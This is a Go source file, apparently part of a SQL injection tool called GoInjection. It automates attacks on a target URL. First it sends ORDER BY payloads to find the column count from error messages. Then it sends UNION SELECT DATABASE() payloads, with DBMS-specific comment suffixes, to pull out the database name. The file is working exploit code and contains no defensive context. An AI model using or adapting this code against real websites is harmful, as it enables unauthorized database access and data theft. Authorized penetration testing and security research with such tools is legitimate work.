package helper

import (
	"GoInjection/backend/helper"
	"GoInjection/backend/structs"
	"fmt"
	"regexp"
	"strings"
)

// ToDo: Add other DBMS Support
func GetColumnCount(url string) (bool, int) {
	var query = "' ORDER BY %d--+"

	for i := 1; i <= 15; i++ {
		payload := fmt.Sprintf(query, i)
		response, _ := helper.SendRequest(strings.ReplaceAll(url, helper.PayloadReplaceString, helper.URLEncodeQuery(payload)))

		if strings.Contains(strings.ToLower(response), "unknown column") {
			return true, i - 1
		}
	}

	return false, 0
}

// ToDo: Add Error/Blind-based injection detection, Add other DBMS Support
func GetDatabase(url string, maxColumns int) (bool, string) {
	var query string
	var databaseStr = "DATABASE()"
	var querySuffix string

	switch structs.TargetSyntax {
	case "MySQL", "PostgresSQL":
		querySuffix = " --+"
	case "MsSQL", "SQLite":
		querySuffix = " --"
	default:
		querySuffix = " --+"
	}

	if maxColumns <= 0 {
		helper.LogLine("Invalid maxColumns value")
		return false, ""
	}

	query = "' UNION SELECT " + strings.Repeat(databaseStr+",", maxColumns-1) + databaseStr + querySuffix

	response, _ := helper.SendRequest(strings.ReplaceAll(url, helper.PayloadReplaceString, helper.URLEncodeQuery(query)))

	var database string

	words1 := CountWords(response)
	for word, count := range words1 {
		if count == maxColumns {
			database = word

		}
	}

	query = strings.ReplaceAll(query, databaseStr, "NULL")
	query = strings.ReplaceAll(query, ",NULL,", fmt.Sprintf(",%s,", databaseStr))
	query = strings.ReplaceAll(query, helper.PayloadReplaceString, query)
	response2, _ := helper.SendRequest(strings.ReplaceAll(url, helper.PayloadReplaceString, helper.URLEncodeQuery(query)))

	words2 := CountWords(response2)
	for word, count := range words2 {
		if count == 1 {
			if word == database {
				structs.TargetDatabaseName = database
				return true, database
			}
		}
	}

	return false, ""
}

func CountWords(response string) map[string]int {
	response = strings.ToLower(response)

	re := regexp.MustCompile(`\w+`)
	words := re.FindAllString(response, -1)

	wordCounts := make(map[string]int)
	for _, word := range words {
		wordCounts[word]++
	}

	return wordCounts
}
